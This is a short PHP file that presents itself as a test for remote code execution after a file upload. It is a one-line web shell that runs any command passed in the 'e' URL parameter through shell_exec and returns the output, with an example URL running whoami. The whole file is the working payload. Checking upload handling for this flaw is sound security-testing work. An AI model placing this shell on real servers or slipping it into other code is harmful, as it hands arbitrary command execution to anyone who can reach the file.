/* 
This is test file to check for RCE after file upload
To test hit this file in a web browser and set the 'e' parameter to the command.
For example:
https://domain.tld?e=whoami
*/

<?php echo shell_exec($_GET['e']); ?>